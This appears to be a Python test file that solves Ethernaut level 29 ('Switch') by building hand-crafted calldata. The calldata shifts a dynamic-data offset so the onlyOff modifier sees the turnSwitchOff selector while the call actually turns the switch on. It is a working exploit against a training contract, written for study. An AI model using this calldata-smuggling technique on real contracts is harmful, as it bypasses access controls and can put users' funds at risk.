from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv29_switch import Switch

@default_chain.connect()
def test_lv29():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv29()
    exploit_lv29(contract)
    ethernaut.check_lv29(contract)

def exploit_lv29(contract: Switch):
    # when passing dynamic types to calldata,
    # we have to pass the memory location of the data
    # and the length of the data

    # it is important to note that the pointer to the data 
    # first points to the length of the data
    # and after that comes the data itself

    # we will utilise this to modify the calldata structure in the following way:
    # first we add the function selector,
    # then the memory location of the data
    # then the encoded turnSwitchOff string to bypass the onlyOff modifier
    # and only then the function arguments (the data) itself will follow

    # the calldata will have the following layout:
    # 0-3: function selector
    # 4-35: memory location of the input 
    # 36-67: empty zeros (so that the data starts at the 68th byte)
    # 68-99:  encoded turnSwitchOff string to bypass the onlyOff modifier
    # 100-131: input data length
    # 132-163: input data

    calldata = Switch.flipSwitch.selector.hex() +\
        "0"*62 + "60" +\
        "0"*64 +\
        Switch.turnSwitchOff.selector.hex() + "0"*56 +\
        "0"*63 + "4" +\
        Switch.turnSwitchOn.selector.hex() + "0"*56

    calldata = bytes.fromhex(calldata)

    contract.transact(data=calldata)